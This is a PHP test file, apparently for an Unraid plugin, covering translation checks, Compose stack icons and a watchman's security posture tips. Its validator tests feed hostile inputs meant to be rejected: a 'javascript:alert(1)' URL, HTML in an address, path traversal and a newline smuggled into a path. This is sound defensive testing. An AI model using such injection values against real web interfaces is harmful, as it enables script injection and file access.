    $sources['restore'] = array_merge($sources['restore'] ?? [], $sources['restore-drill'] ?? []);
    unset($sources['restore-drill']);
    foreach ($sources as $desk => $files) {
        foreach ($files as $file) {
            preg_match_all("/\\bfinding\\(\\s*'([a-z0-9_]+)'/", (string) file_get_contents($file), $m);
            foreach (array_unique($m[1]) as $id) {
                check("$desk: text for check '$id'", isset($en["$desk.check.$id"]));
            }
        }
    }

    // plurals (QA 2026-10-08 #9: «1 warnings», «1 alerts · 9 warnings unread»): a key that is a plural in English is one
    // in all five; a text with several counts is composed of count.<what> keys (one/other with {n}), which the pages ask
    // for through nOf('<what>') or T('count.<what>', …); no «file(s)» behind a count
    foreach ($sets as $desk => $dir) {
        $where = $desk === '' ? 'office' : $desk;
        $e = langFile("$dir/en.json");
        $plurals = array_keys(array_filter($e, 'is_array'));
        foreach ($complete as $code) {
            $l = langFile("$dir/$code.json");
            same("$where/$code: every English plural is a plural", [], array_values(array_filter($plurals, fn ($k) => !langPluralOk($l[$k] ?? null))));
        }
        same("$where: count.* keys are plurals of {n}", [], array_values(array_filter(array_keys($e),
            fn ($k) => str_starts_with($k, 'count.') && !(langPluralOk($e[$k]) && langPlaceholders($e[$k]) === ['n']))));
        same("$where: no «(s)» behind a count — a plural instead", [], array_values(array_keys(array_filter($e,
            fn ($v) => is_string($v) && preg_match('/\{\w+\}[^{}"]{0,30}?[a-z]\((?:s|es)\)/', $v)))));
    }
    foreach (glob("$pub/desks/*/*.js") ?: [] as $file) {
        $desk = basename(dirname($file));
        preg_match_all("/\\bnOf\\(\\s*'([a-z0-9_]+)'/", (string) file_get_contents($file), $m);
        foreach (array_unique($m[1]) as $what) {
            check("$desk/" . basename($file) . " counts with $desk.count.$what", isset($en["$desk.count.$what"]));
        }
    }
    same('watchman: the log line «took over the watch» counts in words',
        '1 login address, 2 containers (0 with special rights), 1 plugin, 3 shares (1 open to guests)',
        watchmanSummaryLine(['ips' => 1, 'containers' => 2, 'special' => 0, 'plugins' => 1, 'shares' => 3, 'open' => 1]));
    same('watchman: the watch entry in German words', '1 Anmeldeadresse', watchmanText(['kind' => 'watch', 'p' => ['ips' => 1]], 'de')['ips'] ?? null);

    // the watchman's book shows every entry's group as a chip with its title (desk.js: group.<g>, group_title.<g>)
    foreach (array_unique(array_column(WATCH_KINDS, 0)) as $group) {
        check("watchman: chip and title for group '$group'", isset($en["watchman.group.$group"], $en["watchman.group_title.$group"]));
    }

    // every Problem key has a text, at a desk or in the office
    $errors = [];
    foreach ($en as $k => $_) {
        if (preg_match('/(?:^|\.)errors\.([a-z0-9_]+)$/', $k, $x)) {
            $errors[$x[1]] = true;
        }
    }
    foreach (array_merge(glob(OFFICE_DIR . '/agent/*.php') ?: [], glob(OFFICE_DIR . '/agent/lib/*.php') ?: [], glob(OFFICE_DIR . '/agent/desks/*.php') ?: [],
                         glob(OFFICE_DIR . '/src/*.php') ?: []) as $file) {
        preg_match_all("/new (?:Problem|OfficeProblem)\\(\\s*'([a-z0-9_]+)'/", (string) file_get_contents($file), $m);
        foreach (array_unique($m[1]) as $key) {
            check(basename($file) . ": text for error '$key'", isset($errors[$key]));
        }
    }
}

/** Ms. Dustdevil squares pictures that aren't square (Unraid would squeeze them) */
/**
 * A Compose stack's own picture (Compose Manager's icon_url): listed when it is missing, empty or points nowhere,
 * proposing its main app's picture (never its database's); hung into icon_url with the old state in the storeroom,
 * a picture copied into the stack's folder when it must be a file; put back — on copies in a temporary folder.
 */
function testIconStacks(): void
{
    // what Compose Manager shows (StackInfo::getIconUrl(), IconCache.php)
    foreach (['https://x/a.png' => true, 'http://x:8080/a.png?b=1' => true, 'HTTPS://x/a.png' => false, 'https://' => false,
              'data:image/png;base64,iVBORw0K' => true, 'data:text/html,<b>' => false, 'file:///boot/x.png' => false, 'ftp://x/a.png' => false,
              '/etc/x.png' => false, CL_COMPOSE_DEF . '/../x.png' => false,
              CL_COMPOSE_DEF . '/office-tests-none-' . getmypid() . '/icon.png' => false] as $v => $want) {
        same('stack icon: Compose Manager shows ' . json_encode($v), $want, clStackIconOk((string) $v));
    }
    same('stack icon: a copy may go into its projects folder only', [true, false, false, false],
        [clStackIconCopyOk(CL_COMPOSE_DEF . '/web'), clStackIconCopyOk('/tmp/web'), clStackIconCopyOk(CL_COMPOSE_DEF . '/../web'), clStackIconCopyOk(CL_COMPOSE_DEF . "/a\nb")]);
    same('stack icon: home of icon_url', '/r/p', clIconHome('/r/p/icon_url', '/r'));
    same('stack icon: no home deeper or elsewhere', '', clIconHome('/r/p/q/icon_url', '/r') . clIconHome('/x/p/icon_url', '/r'));

    $tmp = sys_get_temp_dir() . '/office-tests-stackicons-' . getmypid();
    $root = "$tmp/projects";
    foreach (['missing', 'empty', 'nowhere', 'odd', 'present', 'lonely', 'bare'] as $f) {
        @mkdir("$root/$f", 0700, true);
    }
    file_put_contents("$root/empty/icon_url", "  \n");
    file_put_contents("$root/nowhere/icon_url", CL_COMPOSE_DEF . '/office-tests-none-' . getmypid() . '/icon.png');
    file_put_contents("$root/odd/icon_url", 'file:///boot/config/x.png');
    file_put_contents("$root/present/icon_url", "https://x/present.png\n");
    $stack = fn (string $f, array $names) => ['folder' => $f, 'dir' => "$root/$f", 'name' => ucfirst($f),
                                               'containers' => array_map(fn ($n) => ['name' => $n, 'state' => 'running'], $names)];
    $row = fn (string $name, string $service, string $image, string $category, string $value, array $candidates = []) =>
        ['id' => "icon:$name", 'name' => $name, 'service' => $service, 'image' => $image, 'project' => null, 'category' => $category,
         'value' => $value, 'candidates' => $candidates];
    $icons = [
        $row('missing-db', 'db', 'mariadb:11', 'ok', 'https://x/mariadb.png'),
        $row('missing-app', 'app', 'example/notes:2', 'ok', 'https://x/notes.png'),
        $row('missing-ml', 'machine-learning', 'example/notes-ml:2', 'ok', 'https://x/ml.png'),
        $row('empty-web', 'web', 'nginx', 'ok', 'https://x/web.png'),
        $row('nowhere', 'nowhere', 'example/board', 'ok', 'https://x/board.png'),
        $row('odd-server', 'server', 'example/odd', 'ok', 'file:///boot/config/plugins/x/odd.png'),
        $row('present-app', 'app', 'example/p', 'ok', 'https://x/p.png'),
        $row('lonely-redis', 'redis', 'redis', 'ok', 'https://x/redis.png'),
        $row('bare-app', 'app', 'example/bare', 'compose', '', [['url' => 'file:///boot/x.png', 'source' => 'dockerman', 'detail' => 'x'],
                                                              ['url' => 'https://x/bare.png', 'source' => 'ca', 'detail' => 'example/bare']]),
    ];
    $stacks = ['list' => [$stack('missing', ['missing-db', 'missing-app', 'missing-ml']), $stack('empty', ['empty-web']), $stack('nowhere', ['nowhere']),
                          $stack('odd', ['odd-server']), $stack('present', ['present-app']), $stack('lonely', ['lonely-redis']), $stack('bare', ['bare-app']),
                          $stack('idle', [])]];
    $rows = array_column(clIconStacks($stacks, $icons), null, 'folder');
    same('stack rows: one per stack with containers', ['missing', 'empty', 'nowhere', 'odd', 'present', 'lonely', 'bare'], array_keys($rows));
    same('stack rows: what they are', ['missing' => ['stack', 'missing', ''], 'empty' => ['stack', 'missing', ''], 'nowhere' => ['stack', 'broken', CL_COMPOSE_DEF . '/office-tests-none-' . getmypid() . '/icon.png'],
                                       'odd' => ['stack', 'broken', 'file:///boot/config/x.png'], 'present' => ['ok', 'ok', 'https://x/present.png'],
                                       'lonely' => ['stack', 'missing', ''], 'bare' => ['stack', 'missing', '']],
        array_map(fn ($e) => [$e['category'], $e['status'], $e['value']], $rows));
    $r = $rows['missing'];
    same('stack row: its fields', ['iconstack:missing', 'icon', 'stack', 'Missing', "$root/missing/icon_url", "$root/missing", false, 'missing-app'],
        [$r['id'], $r['kind'], $r['target'], $r['name'], $r['path'], $r['dir'], $r['copy_ok'], $r['main']]);
    same('stack row: its main app first, a side part after, never the database', [['https://x/notes.png', 'stack_app', 'missing-app'], ['https://x/ml.png', 'stack_app', 'missing-ml']],
        array_map(fn ($c) => [$c['url'], $c['source'], $c['detail']], $r['candidates']));
    same('stack row: a picture on the server only where it may be copied to', [], $rows['odd']['candidates']);
    same('stack row: only a database or cache — nothing to propose', [null, []], [$rows['lonely']['main'], $rows['lonely']['candidates']]);
    same('stack row: the main app without a picture — what was found for it (addresses only here)', ['https://x/bare.png'], array_column($rows['bare']['candidates'], 'url'));
    same('stack row: present — shown, nothing proposed', ['https://x/present.png', []], [$rows['present']['shown'], $rows['present']['candidates']]);
    file_put_contents("$tmp/p.png", "\x89PNG\r\n\x1a\nxx");
    same('stack row: a file it shows is previewed', ["file://$tmp/p.png"], array_keys(clIconPreviews([['category' => 'ok', 'shown' => "file://$tmp/p.png", 'candidates' => []]])));

    // hanging: an address as it is; the old state (none) into the storeroom; put back removes it
    $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==');
    file_put_contents("$tmp/square.png", $png);
    $e = $rows['missing'] + ['pick' => 'https://x/notes.png', 'upload' => null];
    $e['copy_ok'] = true;
    $got = ['https://x/notes.png' => ['ok' => true, 'file' => "$tmp/square.png"]];
    $runs = [];
    clIconStackHang($e, $got, $root, $runs);
    $run = $runs["$tmp/" . CL_TRASH] ?? null;
    same('hang: icon_url is the address', 'https://x/notes.png', @file_get_contents("$root/missing/icon_url"));
    $as = 'icons/' . substr(md5("$root/missing"), 0, 8) . '/icon_url';
    $item = $run['items'][0] ?? [];
    same('hang: the storeroom knows it', ['icon', 'icon_url', 'Missing', "$root/missing/icon_url", $as, md5('https://x/notes.png'), 'missing', []],
        [$item['kind'] ?? null, $item['name'] ?? null, $item['label'] ?? null, $item['from'] ?? null, $item['as'] ?? null, $item['written'] ?? null, $item['was'] ?? null, $item['copies'] ?? null]);
    same('hang: the manifest is written', 1, count((array) ((readJson($run['path'] . '/manifest.json') ?? [])['items'] ?? [])));
    check('hang: the shape a storeroom entry must have', clTrashAsOk($as, 'icon', $run['stamp']));
    check('hang: nothing copied for an address', !file_exists("$root/missing/icon.png"));
    try {
        clIconStackHang($e, $got, $root, $runs);
        check('hang: refused once it has a picture', false);
    } catch (Problem $p) {
        same('hang: refused once it has a picture', 'cleanup_icon_has', $p->key);
    }
    clIconPutBack($run['path'] . "/$as", $item);
    check('put back: icon_url gone again, out of the storeroom', !file_exists("$root/missing/icon_url") && !file_exists($run['path'] . "/$as"));

    // an upload over an icon_url that points nowhere: copied into the stack's folder, the old one kept
    $old = (string) file_get_contents("$root/nowhere/icon_url");
    $e = $rows['nowhere'] + ['pick' => null, 'upload' => $png];
    $e['copy_ok'] = true;
    $runs = [];
    clIconStackHang($e, [], $root, $runs);
    $run = $runs["$tmp/" . CL_TRASH];
    $item = $run['items'][0];
    $as = $item['as'];
    same('upload: icon_url names the copy', "$root/nowhere/icon.png", @file_get_contents("$root/nowhere/icon_url"));
    same('upload: the copy is the picture', md5($png), (string) @md5_file("$root/nowhere/icon.png"));
    same('upload: the old icon_url in the storeroom', $old, @file_get_contents($run['path'] . "/$as"));
    same('upload: what put back takes away', ['there', ["$root/nowhere/icon.png" => md5($png)]], [$item['was'], $item['copies']]);
    file_put_contents("$root/nowhere/icon_url", 'https://x/someone-else.png');
    try {
        clIconPutBack($run['path'] . "/$as", $item);
        check('put back: refused once icon_url changed', false);
    } catch (Problem $p) {
        same('put back: refused once icon_url changed', 'cleanup_icon_changed', $p->key);
    }
    file_put_contents("$root/nowhere/icon_url", "$root/nowhere/icon.png");
    clIconPutBack($run['path'] . "/$as", $item);
    same('put back: the old icon_url again', $old, @file_get_contents("$root/nowhere/icon_url"));
    check('put back: the copy gone', !file_exists("$root/nowhere/icon.png"));

    // the same picture again is used again (not removed by put back); another file of that name stays
    file_put_contents("$root/empty/icon.png", 'not ours');
    $e = $rows['empty'] + ['pick' => null, 'upload' => $png];
    $e['copy_ok'] = true;
    $runs = [];
    clIconStackHang($e, [], $root, $runs);
    $item = $runs["$tmp/" . CL_TRASH]['items'][0];
    same('copy: beside a file of that name', "$root/empty/icon-2.png", @file_get_contents("$root/empty/icon_url"));
    same('copy: theirs stays', 'not ours', @file_get_contents("$root/empty/icon.png"));
    same('copy: the empty icon_url kept', "  \n", @file_get_contents($runs["$tmp/" . CL_TRASH]['path'] . '/' . $item['as']));
    same('copy: the same picture is used again', ['path' => "$root/empty/icon-2.png", 'created' => false, 'md5' => md5($png)], clStackIconStore("$root/empty", $png));
    file_put_contents("$root/empty/icon-2.png", 'changed');
    clIconPutBack($runs["$tmp/" . CL_TRASH]['path'] . '/' . $item['as'], $item);
    same('put back: empty icon_url again, a changed copy stays', ["  \n", 'changed'], [@file_get_contents("$root/empty/icon_url"), @file_get_contents("$root/empty/icon-2.png")]);

    // a picture from the web that isn't square: a square copy (Unraid would squeeze it); without a place for files: the address
    if (function_exists('imagecreatetruecolor')) {
        $im = imagecreatetruecolor(300, 100);
        imagepng($im, "$tmp/wide.png");
        $e = $rows['lonely'] + ['pick' => 'https://x/wide.png', 'upload' => null];
        $got = ['https://x/wide.png' => ['ok' => true, 'file' => "$tmp/wide.png"]];
        $runs = [];
        clIconStackHang($e, $got, $root, $runs);
        same('wide, no place for files: the address', 'https://x/wide.png', @file_get_contents("$root/lonely/icon_url"));
        unlink("$root/lonely/icon_url");
        $e['copy_ok'] = true;
        $runs = [];
        clIconStackHang($e, $got, $root, $runs);
        $size = @getimagesize("$root/lonely/icon.png");
        same('wide: a square copy', ["$root/lonely/icon.png", 256, 256], [@file_get_contents("$root/lonely/icon_url"), $size[0] ?? null, $size[1] ?? null]);
    }
    // what can't be hung: a file not on this server, an address that didn't load — nothing left behind
    $e = $rows['bare'] + ['pick' => 'file:///boot/office-tests-none.png', 'upload' => null];
    $e['copy_ok'] = true;
    foreach (['a file that is not there' => [$e, []], 'an address that did not load' => [['pick' => 'https://x/bare.png'] + $e, ['https://x/bare.png' => ['ok' => false]]]] as $what => [$x, $got]) {
        $runs = [];
        try {
            clIconStackHang($x, $got, $root, $runs);
            check("hang refused: $what", false);
        } catch (Problem $p) {
            same("hang refused: $what", ['cleanup_icon_fetch_failed', false, []], [$p->key, file_exists("$root/bare/icon_url"), glob("$root/bare/*") ?: []]);
        }
    }
    exec('rm -rf ' . escapeshellarg($tmp));
}

function testIconSquare(): void
{
    if (!function_exists('imagecreatetruecolor')) {
        return;
    }
    $tmp = sys_get_temp_dir() . '/office-tests-square-' . getmypid();
    @mkdir($tmp, 0700, true);
    foreach (['wide' => [1123, 512], 'tall' => [100, 300], 'square' => [200, 200], 'small' => [60, 30]] as $n => [$w, $h]) {
        $im = imagecreatetruecolor($w, $h);
        imagepng($im, "$tmp/$n.png");
        $sq = clIconSquare("$tmp/$n.png");
        if ($n === 'square') {
            same('icon square: a square picture stays', null, $sq);
            continue;
        }
        $size = is_string($sq) ? getimagesizefromstring($sq) : null;
        $want = min(CL_SQUARE_SIDE, max($w, $h));
        same("icon square: $n becomes {$want}x{$want}", [$want, $want], $size ? [$size[0], $size[1]] : null);
    }
    same('icon square: not a picture', null, clIconSquare(__FILE__));
    array_map('unlink', glob("$tmp/*") ?: []);
    @rmdir($tmp);
}

/**
 * The night watchman's posture tips — how secure it stands now: shares open to everyone (a user share, a
 * disk; the flash only «secure» is not), Telnet, Unraid's FTP server (left to Fix Common Problems once it
 * has users), the CPU's protection off (with VMScape and VMs) or on, privileged containers. «I know, thanks»
 * kept on the server, back when what it is about changes, forgotten when it goes; the team lead's hint;
 * entries of a kind he no longer keeps (cron_dead) left out quietly; the data flow's link into Grafana — on
 * copies in a temporary folder.
 */
function testWatchmanPosture(): void
{
    $now = strtotime('2026-10-06 12:00:00');
    $tmp = sys_get_temp_dir() . '/office-tests-posture-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['plugins', 'vulns', 'extra', 'ssh'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'disks_ini' => "$src/disks.ini", 'ident' => "$src/ident.cfg", 'inetd' => "$src/inetd.conf",
              'ftp_users' => "$src/vsftpd.user_list", 'cmdline' => "$src/cmdline", 'cpuinfo' => "$src/cpuinfo", 'cpu_vulns' => "$src/vulns",
              'libvirt_sock' => "$src/libvirt-sock", 'virsh' => "$tmp/virsh"];
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    file_put_contents($paths['syslog'], '');
    $sec = fn (string $more = '') => "[\"Media\"]\nexport=\"e\"\nsecurity=\"public\"\n[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n"
        . "[\"disk1\"]\nexport=\"eh\"\nsecurity=\"public\"\n[\"flash\"]\nexport=\"e\"\nsecurity=\"secure\"\n[\"Old\"]\nexport=\"-\"\nsecurity=\"public\"\n$more";
    file_put_contents($paths['sec'], $sec());
    file_put_contents($paths['sec_nfs'], "[\"Media\"]\nexport=\"e\"\nsecurity=\"public\"\n");
    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\nshareNFSEnabled=\"yes\"\n");
    file_put_contents($paths['disks_ini'], "[\"disk1\"]\nname=\"disk1\"\n[\"flash\"]\nname=\"flash\"\n");
    file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\nUSE_SSH=\"yes\"\n");
    file_put_contents($paths['inetd'], "# Unraid's inetd\nftp     stream  tcp     nowait  root    /usr/sbin/tcpd  vsftpd\n");
    file_put_contents($paths['cmdline'], "BOOT_IMAGE=/bzimage mitigations=off unraiduuid=1\n");
    file_put_contents($paths['cpuinfo'], "vendor_id\t: GenuineIntel\nmodel name\t: Intel(R) Core(TM) Ultra 7 265K\n");
    $vulns = fn (array $v) => array_map(fn ($f, $s) => file_put_contents("$src/vulns/$f", "$s\n"), array_keys($v), $v);
    $vulns(['vmscape' => 'Vulnerable', 'spectre_v2' => 'Vulnerable; IBPB: disabled', 'meltdown' => 'Not affected', 'retbleed' => 'Mitigation: Enhanced IBRS']);
    // libvirt: a stand-in virsh (`list --all --name`), failing while $src/virsh-fails is there
    file_put_contents($paths['libvirt_sock'], '');
    file_put_contents($paths['virsh'], "#!/bin/sh\n[ -e " . escapeshellarg("$src/virsh-fails") . " ] && exit 1\nprintf 'Win11\\n\\n'\n");
    chmod($paths['virsh'], 0755);
    $containers = ['vpn' => ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--privileged']], 'web' => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']]];
    $docker = function () use (&$containers) {
        return $containers;
    };
    $acks = "$tmp/acks.json";
    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $now + $t, $docker, false, $acks);
    $tips = fn (int $t = 10) => array_column(watchmanPageState($data, $now + $t, false)['posture']['tips'] ?? [], null, 'id');

    // his first round: how it stands is told right away (nothing of it is "normal")
    same('posture: before his first round — nothing to show', null, watchmanPageState($data, $now, false)['posture']);
    $round(0);
    $t = $tips();
    same('posture: his tips, in the order of his page', ['flash', 'public', 'telnet', 'ftp', 'mitigations_off', 'vmscape', 'privileged'], array_keys($t));
    same('posture: shares open to everyone — a user share (SMB, NFS) and a disk; the flash (its own tip) and one not exported are not',
        [['names' => 'Media (SMB), Media (NFS), disk1 (SMB)', 'n' => 2], ['to' => 'share', 'name' => 'Media', 'path' => '/Shares/Share?name=Media'], 'advice'],
        [$t['public']['p'], $t['public']['link'], $t['public']['level']]);
    same('posture: the flash exported to guests for reading only is advice too (password hashes, SSH keys), with its page',
        [['proto' => 'SMB', 'level' => 'secure'], ['to' => 'flash', 'path' => '/Main/Boot?name=flash'], 'advice'],
        [$t['flash']['p'], $t['flash']['link'], $t['flash']['level']]);
    $flashTip = fn (array $shares) => array_column(watchmanPosture([], ['shares' => $shares]), null, 'id');
    $both = $flashTip(['flash' => ['smb' => 2, 'nfs' => 1], 'Photos' => ['smb' => 1, 'nfs' => 0]]);
    same('posture: the flash for writing over SMB and reading over NFS — one tip of its own, never among the public shares; a user share «Secure» has none',
        [['flash'], ['proto' => 'SMB, NFS', 'level' => 'public']], [array_keys($both), $both['flash']['p'] ?? null]);
    check('posture: the flash tip comes back when its access changes', ($both['flash']['sig'] ?? 1) !== ($flashTip(['flash' => ['smb' => 1, 'nfs' => 0]])['flash']['sig'] ?? 2));
    same('posture: the flash not exported — no tip', [], $flashTip(['flash' => ['smb' => 0, 'nfs' => 0]]));
    same('posture: links into Unraid — a disk\'s page, the boot device\'s for the flash',
        ['/Shares/Disk?name=disk1', '/Main/Boot?name=flash', '/Shares/Share?name=My%20Share'],
        [watchmanShareLink('disk1', ['disk1', 'flash']), watchmanShareLink('flash', []), watchmanShareLink('My Share', ['disk1'])]);
    same('posture: Telnet, FTP — where to switch them off', ['/Settings/ManagementAccess', '/Settings/FTP'], [$t['telnet']['link']['path'], $t['ftp']['link']['path']]);
    same('posture: the CPU — off, its open flaws (sorted), VMScape with a VM, where to switch it on',
        [['cpu' => 'Intel(R) Core(TM) Ultra 7 265K', 'open' => ['spectre_v2', 'vmscape']], ['n' => 1], '/Settings/BootParameters'],
        [$t['mitigations_off']['p'], $t['vmscape']['p'], $t['mitigations_off']['link']['path']]);
    same('posture: a privileged container — good to know', [['names' => 'vpn', 'n' => 1], 'info'], [$t['privileged']['p'], $t['privileged']['level']]);
    $page = watchmanPageState($data, $now + 10, false);
    same('posture: on the page — nobody knows them yet, six of his advice open', [6, [false]], [$page['posture']['open'], array_values(array_unique(array_column($page['posture']['tips'], 'known')))]);
    check('posture: no signatures on the page', !str_contains(json_encode($page['posture']), 'sig'));
    $hint = array_column(watchmanChecks($data), null, 'id');
    same('posture: the team lead hears it as good to know, next to "quiet"', [true, 'hint', null, 6, '#/watchman'],
        [isset($hint['quiet']), $hint['posture']['level'] ?? null, array_key_exists('ok', $hint['posture'] ?? []) ? $hint['posture']['ok'] : 'x',
         $hint['posture']['params']['n'] ?? null, $hint['posture']['link'] ?? null]);
    same('posture: never in the watch book', ['watch'], array_column(watchmanLoad($data)['book'], 'kind'));

    // «I know, thanks» — for every browser, on the server; the team lead hears one less
    watchmanPostureAck('telnet', true, $data, $now + 20, false);
    watchmanPostureAck('public', true, $data, $now + 21, false);
    $page = watchmanPageState($data, $now + 30, false);
    same('posture ack: known, counted no more', [true, true, false, 4], [$tips(30)['telnet']['known'], $tips(30)['public']['known'], $tips(30)['ftp']['known'], $page['posture']['open']]);
    same('posture ack: the team lead\'s hint follows', 4, array_column(watchmanChecks($data), null, 'id')['posture']['params']['n'] ?? null);
    $round(300);
    same('posture: the next round, the same — still known', [true, true], [$tips(310)['telnet']['known'], $tips(310)['public']['known']]);
    same('posture: VMs counted by libvirt (virsh list --all), never a look into libvirt.img', [1, null, 0],
        [watchmanVms($paths), watchmanVms(['libvirt_sock' => $paths['libvirt_sock'], 'virsh' => "$tmp/none"]), watchmanVms(['libvirt_sock' => "$tmp/none", 'virsh' => 'virsh'])]);
    touch("$src/virsh-fails");
    $round(400);
    same('posture: libvirt didn\'t answer — VMScape as the last round saw it', ['n' => 1], $tips(410)['vmscape']['p'] ?? null);
    unlink("$src/virsh-fails");
    unlink($paths['libvirt_sock']);
    $round(500);
    same('posture: the VM service off — no VM can run, no VMScape', false, isset($tips(510)['vmscape']));
    file_put_contents($paths['libvirt_sock'], '');

    // what it is about changes: back; gone: forgotten, and back as new when it returns
    file_put_contents($paths['sec'], $sec("[\"Photos\"]\nexport=\"e\"\nsecurity=\"public\"\n"));
    file_put_contents($paths['ident'], "USE_TELNET=\"no\"\n");
    $round(600);
    same('posture: another share opened — the tip is back; Telnet off — gone and forgotten',
        [false, 3, false, ['public']], [$tips(610)['public']['known'], $tips(610)['public']['p']['n'], isset($tips(610)['telnet']),
                                         array_keys((readJson("$data/posture.json") ?? [])['acks'] ?? [])]);
    file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\n");
    $round(900);
    same('posture: Telnet on again — told again', false, $tips(910)['telnet']['known'] ?? null);
    watchmanPostureAck('telnet', true, $data, $now + 920, false);
    watchmanPostureAck('telnet', false, $data, $now + 930, false);
    same('posture: «Show again»', false, $tips(940)['telnet']['known']);
    // UPnP on (advice), Unraid Connect's remote access on (good to know) — both from the flash
    file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\nUSE_UPNP=\"yes\"\n");
    file_put_contents("$src/connect.json", '{"dynamicRemoteAccessType":"STATIC","wanport":44321,"username":"x"}');
    watchmanRound($paths + ['connect' => "$src/connect.json"], $data, 1000, $now + 950, $docker, false, $acks);
    same('posture: UPnP on — advice; the WebGUI reachable from the internet — good to know, with its type and port',
        ['advice', 'info', ['type' => 'STATIC', 'port' => '44321']], [$tips(960)['upnp']['level'] ?? null, $tips(960)['remote_access']['level'] ?? null, $tips(960)['remote_access']['p'] ?? null]);
    file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\n");

    // FTP with users while Fix Common Problems is there: its check, he keeps quiet; the CPU protected: good to know
    file_put_contents("$src/plugins/fix.common.problems.plg", "<PLUGIN name=\"fix.common.problems\" version=\"1\">\n");
    file_put_contents($paths['ftp_users'], "benj\n");
    file_put_contents($paths['cmdline'], "BOOT_IMAGE=/bzimage unraiduuid=1\n");
    $vulns(['vmscape' => 'Mitigation: IBPB before exit to userspace', 'spectre_v2' => 'Mitigation: Enhanced IBRS']);
    $containers['vpn']['tokens'] = ['--cap-add=NET_ADMIN'];
    $round(1200);
    same('posture: FTP left to Fix Common Problems, the CPU protected, no privileged container any more', ['flash', 'public', 'telnet', 'mitigations_on'], array_keys($tips(1210)));
    same('posture: the CPU on — which model, good to know', [['cpu' => 'Intel(R) Core(TM) Ultra 7 265K'], 'info'], [$tips(1210)['mitigations_on']['p'], $tips(1210)['mitigations_on']['level']]);
    foreach ([['nothing', true, 'bad_request'], ['telnet', 'yes', 'bad_request'], ['vmscape', true, 'watch_tip_gone']] as [$id, $on, $want]) {
        try {
            watchmanPostureAck($id, $on, $data, $now + 1300, false);
            check("posture ack refused: $id", false);
        } catch (Problem $e) {
            same("posture ack refused: $id", $want, $e->key);
        }
    }
    same('posture ack: «Show again» of a tip that went is harmless', ['ok' => true], watchmanPostureAck('vmscape', false, $data, $now + 1300, false));

    // the watch book: a kind he no longer keeps (cron_dead up to 1.28) is left out quietly
    $book = readJson("$data/book.json") ?? [];
    $book['entries'][] = watchmanEntry('cron_dead', 'cron_dead:/usr/local/emhttp/plugins/gone/run.sh', $now, ['path' => '/usr/local/emhttp/plugins/gone/run.sh', 'plugin' => 'gone']);
    file_put_contents("$data/book.json", json_encode($book));
    $d = watchmanLoad($data);
    same('watch book: an old cron_dead entry is left out quietly — not open, not shown, nothing for the team lead', [false, false, false],
        [in_array('cron_dead', array_column($d['book'], 'kind'), true), isset(watchmanOpenCounts($d['book'])['cron_dead']),
         in_array('cron_dead', array_column(watchmanChecks($data), 'id'), true)]);
    check('watch book: no cron_dead kind any more', !isset(WATCH_KINDS['cron_dead']));

    // the data flow's history in Grafana: only where the consultant saw it with the office's dashboard
    $adv = "$tmp/advisor.json";
    $g = fn (array $grafana, string $webui = 'http://192.168.20.20:3000/', bool $running = true) => file_put_contents($adv, json_encode(
        ['externals' => ['grafana' => ['kind' => 'container', 'there' => true, 'running' => $running, 'webui' => $webui, 'grafana' => $grafana]]]));
    $link = fn () => watchmanPageState($data, $now, false, $adv)['grafana'];
    $g(['points' => true, 'done' => true]);
    same('grafana: the office\'s dashboard at the data flow\'s panels', ['flow_clients' => 'http://192.168.20.20:3000/d/unraid-secretary-office?viewPanel=50',
        'flow_shares' => 'http://192.168.20.20:3000/d/unraid-secretary-office?viewPanel=51'], $link());
    $g(['points' => true, 'done' => true], 'http://10.0.0.5:3000/grafana/?orgId=1');
    same('grafana: under a sub path, without its query', 'http://10.0.0.5:3000/grafana/d/unraid-secretary-office?viewPanel=50', $link()['flow_clients'] ?? null);
    $none = [];
    foreach ([[['points' => true, 'done' => false]], [['points' => false, 'done' => true]], [['points' => true, 'done' => null]],
              [['points' => true, 'done' => true], 'javascript:alert(1)'], [['points' => true, 'done' => true], 'http://x:3000/ "<b>'],
              [['points' => true, 'done' => true], 'http://192.168.20.20:3000/', false]] as $case) {
        $g(...$case);
        $none[] = $link();
    }
    same('grafana: no link without the dashboard provisioned where Grafana reads it, while stopped, or with an odd address', array_fill(0, 6, null), $none);
    same('grafana: no consultant\'s look — no link', null, watchmanPageState($data, $now, false, "$tmp/none.json")['grafana']);
    $dash = json_decode((string) file_get_contents(OFFICE_DIR . '/monitoring/grafana-dashboard.json'), true) ?: [];
    $exprs = [];
    $walk = function (array $panels) use (&$walk, &$exprs): void {
        foreach ($panels as $p) {
            $exprs[(int) ($p['id'] ?? 0)] = implode(' ', array_column((array) ($p['targets'] ?? []), 'expr'));
            $walk((array) ($p['panels'] ?? []));
        }
    };
    $walk((array) ($dash['panels'] ?? []));
    same('grafana: the dashboard the link names', ADVISOR_DASHBOARD_UID, $dash['uid'] ?? null);
    foreach (['flow_clients' => 'uso_watchman_sent_bytes_total', 'flow_shares' => 'uso_watchman_written_bytes_total'] as $group => $metric) {
        check("grafana: panel " . WATCH_GRAFANA_PANELS[$group] . " shows $metric ($group)", str_contains($exprs[WATCH_GRAFANA_PANELS[$group]] ?? '', $metric));
    }

    // every tip has its words, every link its label
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/watchman/lang/en.json'), true) ?: [];
    foreach (array_keys(WATCH_POSTURE) as $id) {
        check("watchman: texts for posture tip $id", isset($en["posture.$id.title"], $en["posture.$id.why"]));
    }
